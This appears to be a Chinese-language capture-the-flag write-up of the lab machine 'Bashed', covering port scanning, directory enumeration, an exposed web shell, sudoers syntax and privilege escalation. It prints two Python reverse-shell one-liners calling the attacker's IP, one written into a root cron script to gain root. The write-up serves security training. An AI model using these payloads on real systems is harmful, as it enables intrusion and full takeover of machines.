
+++
title = 'bashed'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
## 端口扫描

```shell
nmap -vv -sV -sT -A -T 4 10.129.208.65 
```

```
PORT     STATE    SERVICE          REASON      VERSION
80/tcp   open     http             syn-ack     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
259/tcp  filtered esro-gen         no-response
1417/tcp filtered timbuktu-srv1    no-response
5004/tcp filtered avt-profile-1    no-response
9111/tcp filtered DragonIDSConsole no-response

```

### 访问下80端口

![image-20230501152755513](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501152755513.png)

## 目录探测

```shell
gobuster dir --url http://10.129.208.65 -w /usr/share/wordlists/dirb/small.txt
```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.208.65
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/01 14:29:51 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 312] [--> http://10.129.208.65/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.208.65/dev/]
/images               (Status: 301) [Size: 315] [--> http://10.129.208.65/images/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.208.65/js/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.208.65/php/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.208.65/uploads/]
Progress: 959 / 960 (99.90%)
===============================================================
2023/05/01 14:30:35 Finished
===============================================================
```

### 访问下/dev

![image-20230501153106883](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153106883.png)

![image-20230501153207799](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153207799.png)

### 获得了user的flag，尝试进一步提权到root

## 权限提升

![image-20230501153250145](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153250145.png)

### 补充一点关于sudoers文件的知识

```
规则讲解

sudoers文件的数据，每一行分为五个部分，我们用ABCDE来表示。
 一般情况下是: A B = {©} {D} E
 且C与D是可以省略的，我们用大括号扩起来方便大家注意到，但真正书写命令的时候不需要打括号。

    第一个部分A代表授权使用sudo的用户或者组
    第二部分B代表允许授权用户在哪些主机上使用这些权利
    第三部分C代表允许被授权用户提权到什么用户什么组级别的权限，如果省略就代表允许提权到任意用户级别。
    第四部分D代表当被授权用户是否需要输入自身密码来使用特权，若省略这代表需要输入密码
    第五部分E代表允许执行的命令，如果是all就代表允许执行所有命令

第一部分A

A表示的是哪个用户或者哪个用户组拥有执行sudo的权限，当A前面带有%的时候，代表的是用户组。
 例如
 admin all = (all) all
 这行命令表示admin用户可以登陆到任意主机，并且可以提权到任意用户，并且可以执行任意命令，但需要输入用户admin到密码。
 如果在admin前面加上%就会使得admin组的所有用户拥有这些权限，使用的时候需要输入对应用户的密码。而这一行命令典型的就是省略了第四个属性，也就是D，D代表的是密码。
第二部分B

B代表用户可以在哪些电脑上使用这些特权，这一个字段一般是主机名。
 例如：jack mycomputer=/usr/sbin/reboot,/usr/sbin/shutdown
 上面这行表示jack可以在mycomputer上提权到root用户，并且允许以root权限使用reboot与shutdown命令，但是需要输入jack的密码才可以。
第三部分C

代表的是允许提权到的目标用户与组，例如(root:root)的意思就是提权到root用户root组，也就是当前用户使用sudo命令的时候会获得与root用户root组相同的权限。
 当C参数隐藏的时候，默认提权权限就是root。如果是all的话就是指的可以提权到任意用户任意权限。
第四部分D

这个参数是用来定义当目标用户使用sudo的时候，是否需要输入用户密码。如果为NOPASSWD:则表示不需要，否则为需要,注意字母后面带了冒号。
第五部分E

表示允许执行的命令。
```

### 先把shell转发到kali机器上，直接在phpbash里运行python反弹shell的命令

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
```

### 后面的步骤需要耐心观察+运气了

```shell
cd /script
ls -la

```

### 多次使用ls -la可以看到test.txt的最后修改时间，每隔一段时间就会更新。并且test.txt的文件所有者是root，可能是root用户的定时任务每隔一段时间运行test.py生成而来的。这里如果对test.txt的最后一次修改时间观察不仔细，很容易漏掉这个细节，这也是我踩的一个坑。

```
echo 'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);' > test.py
```

### 再次将反弹shell的命令写test.py，同时监听12345端口，看看等下能不能收到shell。

![image-20230501180811085](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501180811085.png)

### 看了下计划任务，果然定时执行test.py文件。